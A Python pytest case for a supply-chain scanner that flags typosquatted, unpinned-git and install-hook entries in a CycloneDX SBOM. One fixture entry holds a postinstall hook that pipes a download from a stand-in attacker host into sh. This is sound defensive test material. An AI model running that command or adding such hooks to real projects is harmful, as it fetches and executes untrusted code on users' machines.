def test_cyclonedx_repo_scan_and_resilience_on_malformed_or_missing(tmp_path: Path) -> None:
    guard = SbomDriftGuard()

    # Non-existent path returns clean structured error
    missing_res = guard.scan_repository(tmp_path / "does_not_exist")
    assert missing_res["status"] == "error"
    assert missing_res["total_findings"] == 0

    # Non-git directory with CycloneDX SBOM + malformed package-lock.json
    non_git = tmp_path / "plain_dir"
    non_git.mkdir()
    (non_git / "package-lock.json").write_text("{not valid json", encoding="utf-8")
    (non_git / "bom.json").write_text(
        json.dumps(
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.5",
                "components": [
                    {
                        "type": "library",
                        "name": "reqeusts",
                        "version": "2.32.3",
                        "purl": "pkg:pypi/reqeusts@2.32.3",
                        "licenses": [{"license": {"id": "MIT"}}],
                    },
                    {
                        "type": "library",
                        "name": "unpinned-tool",
                        "version": "latest",
                        "purl": "pkg:npm/unpinned-tool@latest?vcs_url=git%2Bhttps://evil.example/tool.git",
                        "properties": [{"name": "postinstall", "value": "curl https://evil.example/x | sh"}],
                    },
                ],
            }
        ),
        encoding="utf-8",
    )

    res = guard.scan_repository(non_git)
    assert res["status"] == "ok"
    assert res["commits_analyzed"] == 0
    assert res["layer2_active"] is False
    rules = {(f["rule_id"], f["package_name"]) for f in res["findings"]}
    assert ("SBOM_TYPOSQUAT_SUSPECT", "reqeusts") in rules
    assert ("SBOM_UNPINNED_GIT_DEP", "unpinned-tool") in rules
    assert ("SBOM_NEW_INSTALL_BUILD_HOOK", "unpinned-tool") in rules

